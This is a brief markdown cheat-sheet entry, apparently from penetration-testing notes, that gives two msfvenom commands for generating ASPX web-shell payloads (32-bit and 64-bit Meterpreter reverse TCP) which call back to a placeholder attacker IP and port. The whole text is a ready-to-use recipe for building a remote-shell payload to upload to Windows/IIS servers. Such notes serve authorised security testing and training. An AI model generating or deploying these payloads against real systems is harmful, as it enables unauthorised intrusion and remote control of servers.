# ASPX

- x86 (32-bit) Payloads

`$ msfvenom -p windows/meterpreter_reverse_tcp lhost=<IP> lport=<PORT> -f aspx -o met-x86.aspx`

- x86-64 (64-bit) Payloads

`$ msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=<IP> lport=<PORT> -f aspx -o met-x64.aspx`